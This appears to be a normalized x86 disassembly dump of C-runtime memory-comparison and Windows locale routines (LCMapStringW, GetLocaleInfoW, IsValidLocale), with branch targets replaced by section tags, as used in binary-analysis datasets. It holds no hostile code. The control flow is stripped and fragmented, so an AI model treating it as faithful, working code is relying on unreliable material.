lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
cmp eax [ edx + 0x8 ]
je r-xdata
movzx edi [ esi + 0x5 ]
movzx eax [ edx + 0x5 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x3 ]
movzx eax [ edx + 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x1d ]
movzx eax [ edx - 0x1d ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x8 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x6 ]
movzx eax [ edx + 0x6 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi - 0x19 ]
movzx eax [ edx - 0x19 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x15 ]
movzx eax [ edx - 0x15 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x11 ]
movzx eax [ edx - 0x11 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xd ]
movzx eax [ edx - 0xd ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x9 ]
movzx eax [ edx - 0x9 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x5 ]
movzx eax [ edx - 0x5 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1 ]
movzx eax [ edx - 0x1 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1a ]
movzx eax [ edx - 0x1a ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x16 ]
movzx eax [ edx - 0x16 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x12 ]
movzx eax [ edx - 0x12 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xe ]
movzx eax [ edx - 0xe ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xa ]
movzx eax [ edx - 0xa ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x6 ]
movzx eax [ edx - 0x6 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x2 ]
movzx eax [ edx - 0x2 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1b ]
movzx eax [ edx - 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x17 ]
movzx eax [ edx - 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x13 ]
movzx eax [ edx - 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xf ]
movzx eax [ edx - 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xb ]
movzx eax [ edx - 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x7 ]
movzx eax [ edx - 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x3 ]
movzx eax [ edx - 0x3 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x1c ]
movzx eax [ edx - 0x1c ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x18 ]
movzx eax [ edx - 0x18 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x14 ]
movzx eax [ edx - 0x14 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x10 ]
movzx eax [ edx - 0x10 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0xc ]
movzx eax [ edx - 0xc ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x8 ]
movzx eax [ edx - 0x8 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi - 0x4 ]
movzx eax [ edx - 0x4 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
mov eax [ esi + 0xc ]
cmp eax [ edx + 0xc ]
je r-xdata
movzx edi [ esi + 0x9 ]
movzx eax [ edx + 0x9 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x7 ]
movzx eax [ edx + 0x7 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0xc ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xa ]
movzx eax [ edx + 0xa ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp eax [ edx + 0x10 ]
je r-xdata
movzx edi [ esi + 0xd ]
movzx eax [ edx + 0xd ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xb ]
movzx eax [ edx + 0xb ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx eax [ edx + 0x10 ]
movzx edi [ esi + 0x10 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0xe ]
movzx eax [ edx + 0xe ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax [ edx + 0x14 ]
je r-xdata
movzx edi [ esi + 0x11 ]
movzx eax [ edx + 0x11 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0xf ]
movzx eax [ edx + 0xf ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x14 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x12 ]
movzx eax [ edx + 0x12 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x18 ]
cmp eax [ edx + 0x18 ]
je r-xdata
movzx edi [ esi + 0x15 ]
movzx eax [ edx + 0x15 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x13 ]
movzx eax [ edx + 0x13 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x18 ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x16 ]
movzx eax [ edx + 0x16 ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x1c ]
cmp eax [ edx + 0x1c ]
je r-xdata
movzx edi [ esi + 0x19 ]
movzx eax [ edx + 0x19 ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x17 ]
movzx eax [ edx + 0x17 ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
xor ecx ecx
movzx edi al
movzx eax [ edx + 0x1c ]
sub edi eax
je r-xdata
movzx edi [ esi + 0x1a ]
movzx eax [ edx + 0x1a ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
push 0x20
pop ecx
sub ebx ecx
add esi ecx
add edx ecx
cmp ebx ecx
jae r-xdata
movzx edi [ esi + 0x1d ]
movzx eax [ edx + 0x1d ]
sub edi eax
je r-xdata
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx ecx [ esi + 0x1b ]
movzx eax [ edx + 0x1b ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
movzx edi [ esi + 0x1e ]
movzx eax [ edx + 0x1e ]
sub edi eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
movzx ecx [ esi + 0x1f ]
movzx eax [ edx + 0x1f ]
sub ecx eax
je r-xdata
xor ecx ecx
test edi edi
setg cl
lea ecx [ ecx * 2 - 0x1 ]
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
xor eax eax
test ecx ecx
setg al
lea ecx [ eax * 2 - 0x1 ]
jmp r-xdata
sub_41e6f0
push ebp
mov ebp esp
push esi
xor ecx ecx
mov esi 0xe3
pop esi
pop ebp
retn
test edx edx
jns r-xdata
lea ecx [ eax + 0x1 ]
lea esi [ eax - 0x1 ]
jmp r-xdata
lea eax [ esi + ecx ]
cdq
sub eax edx
mov edx [ ebp + 0x8 ]
sar eax 0x1
sub edx [ eax * 8 + r--data ]
je r-xdata
or eax 0xffffffff
cmp ecx esi
jle r-xdata
sub_41e725
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_41e93b
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e773
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
test eax eax
je r-xdata
xor eax eax
cmp eax 0x400
je r-xdata
cmp eax 0x800
je r-xdata
cmp [ ebp + 0xc ] 0x0
mov esi [ ebp + 0x10 ]
jne r-xdata
test esi esi
js r-xdata
test esi esi
jg r-xdata
push eax
call sub_41e6f0
pop ecx
test eax eax
js r-xdata
mov ebx [ eax * 8 + r--data ]
push 0x55
push ebx
call sub_4248d1
pop ecx
pop ecx
mov edi eax
test esi esi
jle r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
cmp edi esi
jge r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push esi
push [ ebp + 0xc ]
call sub_417a48
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41f421
int3
sub_41e7ef
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_41e725
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_41e82d
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
mov eax [ ebp + 0x8 ]
push 0x1
push sub_41e819
mov [ rw-data ] eax
call [ EnumSystemLocalesW@IAT ]
and [ rw-data ] 0x0
pop ebp
retn
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_41e86a
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call sub_41e7ef
pop ecx
push eax
call [ GetLocaleInfoW@IAT ]
pop ebp
retn
call eax
pop ebp
retn
sub_41e899
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
je r-xdata
call [ GetUserDefaultLCID@IAT ]
push eax
call sub_41e773
add esp 0xc
pop ebp
retn
call eax
pop ebp
retn
sub_41e8c4
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_41e7ef
pop ecx
push eax
call [ IsValidLocale@IAT ]
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_41e8ef
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e7ef
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_41e93b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_41e9a9
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
jle r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41e8ef
add esp 0x18
pop ebp
retn
push eax
push [ ebp + 0x10 ]
call sub_4248d1
pop ecx
pop ecx
sub_41e9fd
push edx
fwait
fnstcw [ esp ]
mov eax [ esp + 0xc ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_42809c
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x80000000
jne r-xdata
call sub_428085
cmp [ rw-data ] 0x0
